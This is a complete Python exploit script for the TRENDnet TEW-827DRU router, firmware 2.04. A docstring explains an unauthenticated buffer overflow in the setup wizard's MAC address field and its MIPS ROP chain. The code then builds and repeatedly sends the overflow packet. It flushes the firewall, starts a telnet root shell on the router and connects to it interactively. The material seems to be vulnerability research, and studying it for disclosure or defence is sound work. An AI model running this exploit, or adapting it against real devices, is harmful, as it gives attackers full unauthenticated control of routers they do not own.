#!/usr/bin/python3
"""
This script exercises an unauthenticated vulnerability in the TRENDNet TEW-827DRU H/W 2.0 F/W 2.04 to open and connect
to a reverse shell.

The router allows unauthenticated access to the setup wizard functionality. Within the setup wizard there is a buffer
overflow processing the MAC address after setting DHCP WAN parameters. The vulnerable disassembly is shown below.

LOAD:0043EE30                 addiu   $a0, $v0, (aCameoWanWanMac - 0x4C0000)  # "cameo.wan.wan_mac"
LOAD:0043EE34                 la      $v0, safe_getenv
LOAD:0043EE38                 nop
LOAD:0043EE3C                 move    $t9, $v0
LOAD:0043EE40                 bal     safe_getenv
LOAD:0043EE44                 nop
LOAD:0043EE48                 lw      $gp, 0x128+saved_gp($fp)
LOAD:0043EE4C                 sw      $v0, 0x128+var_10C($fp)
LOAD:0043EE50                 lw      $v0, 0x128+arg_0($fp)
LOAD:0043EE54                 nop
LOAD:0043EE58                 beqz    $v0, loc_43EEBC
...
LOAD:0043EEBC                 la      $v0, aIdge       # "idge"
LOAD:0043EEC0                 nop
LOAD:0043EEC4                 addiu   $v0, (aUciSetNetworkW_5 - 0x4D0000)  # "uci set network.wan.macaddr=%s"
LOAD:0043EEC8                 addiu   $v1, $fp, 0x128+var_108
LOAD:0043EECC                 move    $a0, $v1         # s
LOAD:0043EED0                 move    $a1, $v0         # format
LOAD:0043EED4                 lw      $a2, 0x128+var_10C($fp)
LOAD:0043EED8                 la      $v0, sprintf
LOAD:0043EEDC                 nop
LOAD:0043EEE0                 move    $t9, $v0
LOAD:0043EEE4                 jalr    $t9 ; sprintf
LOAD:0043EEE8                 nop

The cgi file that contains the exploit was compiled with library randomization enabled meaning the exploit must be
repeatedly thrown until libuClibc gets loaded at the address used as the base in the exploit. Sometimes this is quick,
sometimes it takes a few minutes.

The ROP chain used in the exploit is shown below.
 - rop1 - This router has rather odd behavior, instead of using temporary 's' registers within the function it uses $v0
          and $v1 to move arguments around. Because of this the functions only save $fp and $ra which is kinda hard to
          make useful chains with one registers. The first rop gadget gives us control of $s0 - $s6 to give us a larger
          variety of ROPs available.
 - rop2 - The address of system ends in 0x20, ASCII for space, which we can't directly send in the URL. So, we replace
          the 0x20 with 0x1C and use this gadget to increment the address of system to the proper address.
 - rop3 - Grab a string off the stack and call system with it.

---------------------------------------------------------------
| Gadget Name | Gadget Offset | Gadget Summary                |
---------------------------------------------------------------
| rop1        | 0x0003E164    | lw      $ra, 0x40+var_4($sp)  |
|             |               | lw      $s6, 0x40+var_8($sp)  |
|             |               | lw      $s5, 0x40+var_C($sp)  |
|             |               | lw      $s4, 0x40+var_10($sp) |
|             |               | lw      $s3, 0x40+var_14($sp) |
|             |               | lw      $s2, 0x40+var_18($sp) |
|             |               | lw      $s1, 0x40+var_1C($sp) |
|             |               | lw      $s0, 0x40+var_20($sp) |
|             |               | jr      $ra                   |
|             |               | addiu   $sp, 0x40             |
---------------------------------------------------------------
| rop2        | 0x00053168    | addiu   $s3, 4                |
|             |               | move    $t9, $s5              |
|             |               | jalr    $t9                   |
|             |               | lw      $a0, 0($s3)           |
---------------------------------------------------------------
| rop3        | 0x0003CA64    | addiu   $a0, $sp, 0x70+var_48 |
|             |               | li      $a1, 1                |
|             |               | move    $t9, $s3              |
|             |               | jalr    $t9                   |
|             |               | move    $a2, $s5              |
---------------------------------------------------------------

The overflow is generated using the Mips Overflow Writer from https://github.com/fuzzywalls/mow
"""
import os
import mow
import signal
import argparse
import telnetlib


def ctrl_c_handler(_, __):
    """
    Handle ctrl-c so the program can exit.
    """
    os.kill(os.getpid(), 9)


def telnet_connect(host, port):
    """
    Connect to telnet server.

    :param host: Telnet server IP.
    :type host: str

    :param port: Telnet server listening port.
    :type port: int

    :return: Telnet session or None
    """
    try:
        return telnetlib.Telnet(host, port, 0.1)
    except:
        return None


def generate_exploit(host, port, command):
    """
    Generate packet to exploit the target.

    :param host: IP address of the target.
    :type host: str

    :param port: Listening port of the target.
    :type port: int

    :param command: Command to execute upon successful exploitation.
    :type command: str

    :return: Packet to send to the target.
    :rtype: bytes
    """
    rop1 = 0x3e164
    rop2 = 0x53168
    rop3 = 0x3ca64

    system = 0x57b1c

    overflow = mow.Overflow(0x108, 1, mow.LITTLE_ENDIAN, 0, 0x76fd5000, 'uci set network.wan.macaddr=')
    overflow.ra = rop1
    overflow.add_to_stack(0x3c, address=rop2)
    overflow.add_to_stack(0x34, address=rop3)
    overflow.add_to_stack(0x2c, address=system)
    overflow.add_to_stack(0x68, command=command.replace(' ', '${IFS}'))
    overflow_string = overflow.generate()

    data = {b'ccp_act': b'set',
            b'action': b'wizard_wan',
            b'cameo.wan.wan_proto': b'dhcpc',
            b'cameo.wan.wan_mac': overflow_string}

    data = b'&'.join(b'%s=%s' % (key, value) for key, value in data.items())
    request = mow.CustomRequest(host, port, mow.POST, b'apply_sec.cgi', data=data)
    packet = request.create_packet()
    return packet


def exploit_target(host, port, telnet_port):
    """
    Repeatedly attempt to exploit the target until a reverse shell is established.

    :param host: IP address of the target.
    :type host: str

    :param port: Listening port of the target.
    :type port: int

    :param telnet_port: Port to open to establish the telnet connection.
    :type telnet_port: int
    """
    telnet_command = 'iptables -F|telnetd -l /bin/sh -p %d' % telnet_port
    packet = generate_exploit(host, port, telnet_command)

    print('Repeatedly throwing exploit...this may take some time. Shell will appear when it succeeds.')

    tn = telnet_connect(host, telnet_port)
    while tn is None:
        try:
            mow.send_packet(host, port, packet)
        except:
            continue
        tn = telnet_connect(host, telnet_port)

    tn.interact()


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Unauthenticated buffer overflow processing MAC address during the '
                                                 'DHCP setup wizard in the TRENDNet TEW-827DRU.')

    parser.add_argument('-i', '--ip', help='Target IP address', required=True)
    parser.add_argument('-p', '--port', help='Target port.', type=int, default=80)
    parser.add_argument('-t', '--tport', help='Telnet port to connect to on successful exploitation.', type=int,
                        default=5555)

    args = parser.parse_args()

    signal.signal(signal.SIGINT, ctrl_c_handler)

    exploit_target(args.ip, args.port, args.tport)
